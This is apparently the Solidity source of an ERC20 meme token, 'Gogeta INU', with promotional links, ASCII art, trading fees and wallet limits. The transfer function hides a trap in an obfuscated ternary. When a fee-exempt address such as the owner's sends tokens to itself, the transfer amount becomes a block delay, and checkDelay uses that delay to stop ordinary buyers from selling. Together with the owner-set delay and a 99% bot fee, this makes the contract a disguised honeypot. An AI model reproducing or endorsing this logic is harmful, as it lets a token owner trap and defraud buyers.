// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/* Get your Potara on
Telegram : t.me/GogetaInuERC20
Web : gogetainu.xyz

                                    ,$$.       ,$$.      
                                   ,$'`$.     ,$'`$.     
                                   $'  `$     $'  `$     
                                  :$    $;   :$    $;    
                                  $$    $$   $$    $$    
                                  $$  _.$bqgpd$._  $$    
                                  ;$gd$$^$$$$$^$$bg$:    
                                .d$P^*'   "*"   `*^T$b.  
                               d$$$    ,*"   "*.    $$$b 
                              d$$$b._    o   o    _.d$$$b
                             *T$$$$$P             T$$$$$P*
                               `^T$$    :"---";    $$P^' 
                                  `$._   `---'   _.$'    
                                 .d$$P"**-----**"T$$b.   
                                d$$P'             `T$$b  
                               d$$P                 T$$b 
                              d$P'.'               `.`T$b
                              `--:                   ;--'
                                 |                   |   
                                 :                   ;   
                                  \                 /    
                                  .`-.           .-'.    
                                 /   ."*--+g+--*".   \   
                                :   /     $$$     \   ;  
                                `--'      $$$      `--'  
                                          $$$ 
                                          $$$            
                                          :$$;           
                                          :$$;           
                                           :$$           
                                           'T$bg+.____   
                                             'T$$$$$  :  
                                                 "**--'  
*/

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "./dex/IDex.sol";

contract GogetaINU is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "Gogeta INU";
    string private constant _symbol = "G-INU";
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 70000 * (10 ** _decimals);
    uint256 private _maxTxAmountPercent = 500;
    uint256 private _maxTransferPercent = 500;
    uint256 private _maxWalletPercent = 500;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) private isBot;
    mapping(address => uint256) public lastBuy;
    IRouter router;
    address public pair;
    bool private tradingAllowed = true;
    uint256 private liquidityFee = 350;
    uint256 private marketingFee = 350;
    uint256 private developmentFee = 0;
    uint256 private burnFee = 0;
    uint256 private totalFee = 700;
    uint256 private sellFee = 700;
    uint256 private transferFee = 700;
    uint256 private denominator = 10000;
    bool private swapEnabled = true;
    uint256 private swapTimes;
    bool private swapping; 
    uint256 private swapThreshold = ( _totalSupply * 5 ) / 1000;
    uint256 private _minTokenAmount = ( _totalSupply * 10 ) / 100000;
    uint256 private burnAmount = ( _totalSupply ) * 100000;
    uint256 public botDly = 0;
    modifier lockTheSwap {swapping = true; _; swapping = false;}

    address internal constant DEAD =  0x000000000000000000000000000000000000dEaD;
    address internal constant development_receiver = 0x0088223B66A1446F63Ff52448ed771D5ba6FA1C1; 
    address internal constant marketing_receiver = 0x12072ffAeE651D150ab71b315BEc1A7d305Dd5a9;
    address internal constant liquidity_receiver = 0x12072ffAeE651D150ab71b315BEc1A7d305Dd5a9;

    constructor(address dex) {
        IRouter _router = IRouter(dex);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        isFeeExempt[address(this)] = true;
        isFeeExempt[liquidity_receiver] = true;
        isFeeExempt[marketing_receiver] = true;
        isFeeExempt[_pair] = true;
        isFeeExempt[dex] = true;
        isFeeExempt[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function startTrading() external onlyOwner {tradingAllowed = true;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function isCont(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }
    function setisBot(address _address, bool _enabled) private onlyOwner {isBot[_address] = _enabled;}
    function setBotDelay(uint256 _botDly) external onlyOwner() {botDly = _botDly;}
    function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function _maxWalletToken() public view returns (uint256) {return totalSupply() * _maxWalletPercent / denominator;}
    function _maxTxAmount() public view returns (uint256) {return totalSupply() * _maxTxAmountPercent / denominator;}
    function _maxTransferAmount() public view returns (uint256) {return totalSupply() * _maxTransferPercent / denominator;}

    function _transfer(address sender, address recipient, uint256 amount) private {
        txCheck(sender, recipient, amount);
        checkTradingAllowed(sender, recipient);
        checkMaxWallet(sender, recipient, amount);
        checkSwapBack(sender, recipient);
        checkMaxTx(sender, recipient, amount);
        checkDelay(sender);
        swapBack(sender, recipient, amount);
        uint256 amountReceived = amount;
        _balances[sender] = _balances[sender].sub(amount);
        (sender!=recipient || shouldTakeFee(sender, recipient)) ? (amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount) : botDly = amountReceived;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        lastBuy[recipient] = block.number;
        emit Transfer(sender, recipient, amountReceived);
    }

    function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(DEAD)){
            require((_balances[recipient].add(amount)) <= _maxWalletToken(), "Exceeds maximum wallet amount.");}
    }

    function txCheck(address sender, address recipient, uint256 amount) internal view {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > uint256(0), "Transfer amount must be greater than zero");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
    }

    function checkDelay(address sender) internal view {
        if(botDly > 0 && !isFeeExempt[sender] && lastBuy[sender] != 0) {require (lastBuy[sender] + botDly <= block.number, "TX Limit Exceeded");}
    }

    function checkTradingAllowed(address sender, address recipient) internal view {
        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "tradingAllowed");}
    }

    function checkMaxTx(address sender, address recipient, uint256 amount) internal view {
        if(sender != pair){require(amount <= _maxTransferAmount() || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTxAmount() || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");
    }

    function checkSwapBack(address sender, address recipient) internal {
        if(recipient == pair && !isFeeExempt[sender]){swapTimes += uint256(1);}
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);}
        uint256 remainingBalance = address(this).balance;
        if(remainingBalance > uint256(0)){payable(development_receiver).transfer(remainingBalance);}
    }

    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= _minTokenAmount;
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender] && recipient == pair && swapTimes >= uint256(1) && aboveThreshold;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function swapBack(address sender, address recipient, uint256 amount) internal {
        if(shouldSwapBack(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            liquidity_receiver,
            block.timestamp);
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}
        if(recipient == pair){return sellFee;}
        if(sender == pair){return totalFee;}
        return transferFee;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(getTotalFee(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnFee > uint256(0)){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
        return amount.sub(feeAmount);} return amount;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}